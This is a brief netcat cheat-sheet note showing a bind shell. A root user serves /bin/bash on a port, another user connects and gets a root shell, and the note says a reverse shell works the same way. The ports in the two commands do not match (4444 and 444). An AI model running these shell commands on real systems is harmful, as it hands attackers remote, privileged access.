# Netcat

Hand over a shell:
```
root$ nc -lvp 4444 -e /bin/bash
```

Now connect to it from another user
```
otheruser$ nc 192.168.1.101 444
whoami
root
```

The same thing can be done in reverse. The one listening is giving us the shell.